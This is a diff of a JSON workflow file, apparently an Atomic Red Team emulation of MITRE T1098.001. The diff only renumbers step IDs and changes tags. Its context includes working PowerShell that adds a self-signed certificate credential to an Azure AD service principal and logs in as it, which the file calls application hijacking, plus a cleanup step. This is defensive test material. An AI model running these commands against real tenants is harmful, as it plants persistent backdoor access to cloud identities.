@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "53f5a4e2-b21f-431f-8a34-1fc7f4443618",
+      "id": "bf32705a-5175-44da-b7aa-5702bbeff424",
       "type": "execute-command",
       "data": {
         "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential \u003e $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"#{service_principal_name}\" | Select-Object -First 1\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "1d0074c1-44b2-4e59-ab95-c27f4366d06a",
+      "id": "8d792ea7-99bc-4a2f-be49-91c49d51630d",
       "type": "execute-command",
       "data": {
         "command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore \u003e $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"#{service_principal_name}\" | Select-Object -First 1\n$credz = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from SP\"\n    Remove-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\n",
@@ -25,7 +25,7 @@
       "elevation_required": false
     },
     {
-      "id": "f0de9393-6d8b-4258-9c59-7d0ec3964620",
+      "id": "ffa89426-0d0d-483b-ad14-52b30d977584",
       "name": "Check dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": false
     },
     {
-      "id": "dc6d769e-6693-4621-be83-ebe17affd31f",
+      "id": "f7170220-a651-4e9f-a092-26981b479b5f",
       "name": "Resolve dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": false
     },
     {
-      "id": "4047437a-993a-41a1-927e-9fea80927b80",
+      "id": "5ebf15be-4c87-4706-8fd0-f2864b901bfa",
       "name": "Re-check dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -60,39 +60,39 @@
   ],
   "flows": [
     {
-      "s": "53f5a4e2-b21f-431f-8a34-1fc7f4443618",
+      "s": "bf32705a-5175-44da-b7aa-5702bbeff424",
       "p": "on-success",
-      "o": "1d0074c1-44b2-4e59-ab95-c27f4366d06a"
+      "o": "8d792ea7-99bc-4a2f-be49-91c49d51630d"
     },
     {
-      "s": "53f5a4e2-b21f-431f-8a34-1fc7f4443618",
+      "s": "bf32705a-5175-44da-b7aa-5702bbeff424",
       "p": "on-failure",
-      "o": "1d0074c1-44b2-4e59-ab95-c27f4366d06a"
+      "o": "8d792ea7-99bc-4a2f-be49-91c49d51630d"
     },
     {
-      "s": "f0de9393-6d8b-4258-9c59-7d0ec3964620",
+      "s": "ffa89426-0d0d-483b-ad14-52b30d977584",
       "p": "on-success",
-      "o": "53f5a4e2-b21f-431f-8a34-1fc7f4443618"
+      "o": "bf32705a-5175-44da-b7aa-5702bbeff424"
     },
     {
-      "s": "f0de9393-6d8b-4258-9c59-7d0ec3964620",
+      "s": "ffa89426-0d0d-483b-ad14-52b30d977584",
       "p": "on-failure",
-      "o": "dc6d769e-6693-4621-be83-ebe17affd31f"
+      "o": "f7170220-a651-4e9f-a092-26981b479b5f"
     },
     {
-      "s": "dc6d769e-6693-4621-be83-ebe17affd31f",
+      "s": "f7170220-a651-4e9f-a092-26981b479b5f",
       "p": "on-success",
-      "o": "4047437a-993a-41a1-927e-9fea80927b80"
+      "o": "5ebf15be-4c87-4706-8fd0-f2864b901bfa"
     },
     {
-      "s": "4047437a-993a-41a1-927e-9fea80927b80",
+      "s": "5ebf15be-4c87-4706-8fd0-f2864b901bfa",
       "p": "on-failure",
-      "o": "53f5a4e2-b21f-431f-8a34-1fc7f4443618"
+      "o": "bf32705a-5175-44da-b7aa-5702bbeff424"
     }
   ],
   "tags": [
-    "T1098.001",
-    "atomic-red-team"
+    "T1098",
+    "T1098.001"
   ],
   "input_arguments": [
     {
